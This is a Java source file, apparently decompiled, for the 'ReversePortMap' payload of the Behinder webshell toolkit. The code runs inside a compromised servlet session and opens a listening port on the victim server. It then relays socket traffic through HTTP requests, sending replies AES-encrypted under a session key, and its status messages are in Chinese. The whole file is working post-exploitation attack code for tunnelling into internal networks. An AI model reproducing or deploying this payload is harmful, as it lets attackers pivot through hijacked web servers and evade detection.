package net.rebeyond.behinder.payload.java;

import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class ReversePortMap implements Runnable {
   public static String action;
   public static String listenPort;
   public static String socketHash;
   public static String extraData;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   private String threadType;
   private Map paramMap;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var22 = false;

      ServletOutputStream so = null;
      label272: {
         try {
            var22 = true;
            this.fillContext(obj);
            Map paramMap = new HashMap();
            paramMap.put("request", this.Request);
            paramMap.put("response", this.Response);
            paramMap.put("session", this.Session);
            if (action.equals("create")) {
               try {
                  String serverSocketHash = "reverseportmap_server_" + listenPort;
                  paramMap.put("serverSocketHash", serverSocketHash);
                  paramMap.put("listenPort", listenPort);
                  ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
                  serverSocketChannel.bind(new InetSocketAddress(Integer.parseInt(listenPort)));
                  this.Session.setAttribute(serverSocketHash, serverSocketChannel);
                  serverSocketChannel.socket().setReuseAddress(true);
                  (new Thread(new ReversePortMap("daemon", paramMap))).start();
                  result.put("status", "success");
                  result.put("msg", "success");
                  var22 = false;
               } catch (Exception var29) {
                  result.put("status", "fail");
                  result.put("msg", var29.getMessage());
                  var22 = false;
               }
            } else if (action.equals("list")) {
               List socketList = new ArrayList();
               Enumeration keys = this.Session.getAttributeNames();

               while(keys.hasMoreElements()) {
                  String socketHash = keys.nextElement().toString();
                  if (socketHash.indexOf("reverseportmap") >= 0) {
                     Map socketObj = new HashMap();
                     socketObj.put("socketHash", socketHash);
                     socketList.add(socketObj);
                  }
               }

               result.put("status", "success");
               result.put("msg", this.buildJsonArray(socketList, false));
               var22 = false;
            } else {
               SocketChannel serverInnersocket = null;
               if (action.equals("read")) {
                  serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);
                  serverInnersocket.configureBlocking(false);

                  try {
                     ByteBuffer buf = ByteBuffer.allocate(1024);
                     int bytesRead = serverInnersocket.read(buf);

                     for(so = this.Response.getOutputStream(); bytesRead > 0; bytesRead = serverInnersocket.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                     var22 = false;
                  } catch (Exception var30) {
                     ((HttpServletResponse)this.Response).setStatus(200);
                     so = this.Response.getOutputStream();
                     so.write(new byte[]{56, 33, 73, 55});
                     so.write(var30.getMessage().getBytes());
                     so.flush();
                     so.close();
                     var22 = false;
                  } catch (Error var31) {
                     var22 = false;
                  }
               } else if (action.equals("write")) {
                  serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);

                  try {
                     byte[] extraDataByte = this.base64decode(extraData);
                     ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                     buf.clear();
                     buf.put(extraDataByte);
                     buf.flip();

                     while(buf.hasRemaining()) {
                        serverInnersocket.write(buf);
                     }

                     var22 = false;
                  } catch (Exception var32) {
                     so = this.Response.getOutputStream();
                     so.write(new byte[]{56, 33, 73, 55});
                     so.write(var32.getMessage().getBytes());
                     so.flush();
                     so.close();
                     serverInnersocket.close();
                     var22 = false;
                  }
               } else if (!action.equals("stop")) {
                  if (action.equals("close")) {
                     try {
                        serverInnersocket = (SocketChannel)this.Session.getAttribute(ReversePortMap.socketHash);
                        serverInnersocket.close();
                        this.Session.removeAttribute(ReversePortMap.socketHash);
                     } catch (Exception var26) {
                     }

                     result.put("status", "success");
                     result.put("msg", "服务侧Socket资源已释放。");
                     var22 = false;
                  } else {
                     var22 = false;
                  }
               } else {
                  Enumeration keys = this.Session.getAttributeNames();

                  String socketHash;
                  while(keys.hasMoreElements()) {
                     socketHash = keys.nextElement().toString();
                     if (socketHash.startsWith("reverseportmap_socket_" + listenPort)) {
                        try {
                           serverInnersocket = (SocketChannel)this.Session.getAttribute(socketHash);
                           this.Session.removeAttribute(socketHash);
                           serverInnersocket.close();
                        } catch (Exception var28) {
                        }
                     }
                  }

                  try {
                     socketHash = "reverseportmap_server_" + listenPort;
                     ServerSocketChannel serverSocket = (ServerSocketChannel)this.Session.getAttribute(socketHash);
                     this.Session.removeAttribute(socketHash);
                     serverSocket.close();
                  } catch (Exception var27) {
                  }

                  result.put("status", "success");
                  result.put("msg", "服务侧Socket资源已释放。");
                  var22 = false;
               }
            }
            break label272;
         } catch (Exception var33) {
            result.put("status", "fail");
            result.put("msg", action + ":" + var33.getMessage());
            var22 = false;
         } finally {
            if (var22) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var23) {
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var24) {
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var25) {
      }

      return true;
   }

   public ReversePortMap(String threadType, Map paramMap) {
      this.threadType = threadType;
      this.paramMap = paramMap;
   }

   public ReversePortMap() {
   }

   public void run() {
      if (this.threadType.equals("daemon")) {
         try {
            HttpSession session = (HttpSession)this.paramMap.get("session");
            String serverSocketHash = this.paramMap.get("serverSocketHash").toString();
            ServerSocketChannel serverSocketChannel = (ServerSocketChannel)session.getAttribute(serverSocketHash);
            String listenPort = this.paramMap.get("listenPort").toString();

            while(true) {
               try {
                  SocketChannel serverInnersocket = serverSocketChannel.accept();
                  Map paramMap = new HashMap();
                  paramMap.put("session", session);
                  String serverInnersocketHash = "reverseportmap_socket_" + listenPort + "_" + serverInnersocket.socket().getInetAddress().getHostAddress() + "_" + serverInnersocket.socket().getPort();
                  paramMap.put("serverInnersocketHash", serverInnersocketHash);
                  session.setAttribute(serverInnersocketHash, serverInnersocket);
               } catch (Exception var8) {
                  break;
               }
            }
         } catch (Exception var9) {
         }
      }

   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }
}
